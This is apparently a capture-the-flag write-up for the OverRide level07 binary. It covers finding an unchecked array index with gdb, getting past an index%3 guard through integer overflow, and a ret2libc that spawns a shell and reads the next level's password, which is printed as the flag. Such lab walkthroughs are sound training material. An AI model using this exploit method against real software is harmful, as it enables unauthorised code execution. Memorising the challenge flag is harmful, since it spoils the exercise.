### notes
```c
0x08048723  main
0x080486d7  read_number
0x08048630  store_number
0x080485e7  get_unum
```
---
##### 0x08048723 : main() : assembly
- check [Ressources/asm-explained.md](./Ressources/asm-explained.md#0x08048723--main--assembly)
##### 0x080486d7 : read_number(int *tab) : assembly
- check [Ressources/asm-explained.md](./Ressources/asm-explained.md#0x080486d7--read_numberint-tab--assembly)
##### 0x08048630 : store_number(int *tab) : assembly
- check [Ressources/asm-explained.md](./Ressources/asm-explained.md#0x08048630--store_numberint-tab--assembly)
##### 0x080485e7 : get_unum() : assembly
- check [Ressources/asm-explained.md](./Ressources/asm-explained.md#0x080485e7--get_unum--assembly)

---
### Code Prediction
- check [source](./source)
---
### Stack Illustration
- N/A
---
### Process of the Exploit
- The program store input numbers in an array and let us see the array

- After disas, we know the program store in an array of 100 : int tab[100] BUT there isn't check on the index, we can store and read at more than 100 and less than 0
```shell
level07@OverRide:~$ ./level07 
----------------------------------------------------
Welcome to wil's crappy number storage service!   
----------------------------------------------------
Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
wil has reserved some storage :>                 
----------------------------------------------------

Input command: store
Number: 1337
Index: 13
Completed store command successfully
Input command: read
Index: 13
Number at data[13] is 1337
Completed read command successfully
Input command: 
```
- We can't store in all the tab, some indexes are protected (index % 3 == 0) and the argv and env are cleaned at the beginning...
- Without the index protection we can read in the stack, like a format string
- Let's find the EIP address with this and maybe use it for a ret2libc! To do it, we need to find the index of EIP on the tab
- First, find the address of the tab, of the index 0
- Put a breakpoint at the start of the function read_number and get the argument, it's the tab
```shell
(gdb) b read_number
Breakpoint 1 at 0x80486dd
(gdb) r
Starting program: /home/users/level07/level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: read

Breakpoint 1, 0x080486dd in read_number ()
(gdb) x $ebp+0x8
0xffffd430:	0xffffd454
(gdb) 
```
- **0xffffd430** is the **address** of where is stored the **tab** address and **0xffffd454** is the address of the **tab itself**.
 
- We need now the index of EIP in the read_number function
```
(gdb) set disassembly-flavor intel
(gdb) b read_number
Breakpoint 1 at 0x80486dd
(gdb) b *main+520
Breakpoint 2 at 0x804892b
(gdb) run
Starting program: /home/users/level07/level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: read

Breakpoint 2, 0x0804892b in main ()
```
- Get the frame infos to get EIP
```
(gdb) i f
Stack level 0, frame at 0xffffd620:
 eip = 0x804892b in main; saved eip 0xf7e45513
 Arglist at 0xffffd618, args: 
 Locals at 0xffffd618, Previous frame's sp is 0xffffd620
 Saved registers:
  ebx at 0xffffd60c, ebp at 0xffffd618, esi at 0xffffd610, edi at 0xffffd614, eip at 0xffffd61c
(gdb) 
```
- **EIP**  is **`0xffffd61c`**. Find the addres by calculating the difference between the tab address and the EIP address like before
 
```txt
0xffffd62c - 0xffffd464 = 456

456 / 4 = 114
```
- The index of EIP in the tab seems to be 114, check it
```shell
Input command: read
 Index: 114
 Number at data[114] is 4158936339
 Completed read command successfully
Input command: 
```
`4158936339 == 0xf7e45513` that's good

Verify by checking the content of EIP at the same breakpoint
```shell
Breakpoint 2, 0x0804892b in main ()

(gdb) x/x 0xffffd62c
0xffffd62c:	0xf7e45513
```
- Ok, it's good. We have the index of EIP. We will try to overwrite it with the system function to do a ret2libc

    - **system** : **`0xf7e6aed0`** : **`4159090384`**
    - **/bin/sh** : **`0xf7f897ec`** : **`4160264172`**
- BUT... the index 114 is protected. We need to bypass it for write at this index. We can do it with the int overflow

To get 114 by the overflow : **(UINT_MAX / 4) + 114**
```txt
( 4294967296 / 4 ) + 114 ) = 1073741938

1073741938 % 3 = 1
```
##### the exploit of ret2libc :
```c
index 114 : system address in decimal (4159090384)
index 115 : will be DUMM (no need to set it)
index 116 : /bin/sh address in decimal (4160264172)
```
- 114 will be converted to 1073741938 to bypass the index check
---

### Solution :
- apply the exploit

```shell
level07@OverRide:~$ ./level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4160264172                     
 Index: 116
 Completed store command successfully
Input command: quit
$ whoami
level08
$ pwd
/home/users/level07
$ cat /home/users/level08/.pass                         
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
$ 

```
|**`flag : 7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC`**
---

### Ressources :
[Integer_overflow](https://en.wikipedia.org/wiki/Integer_overflow)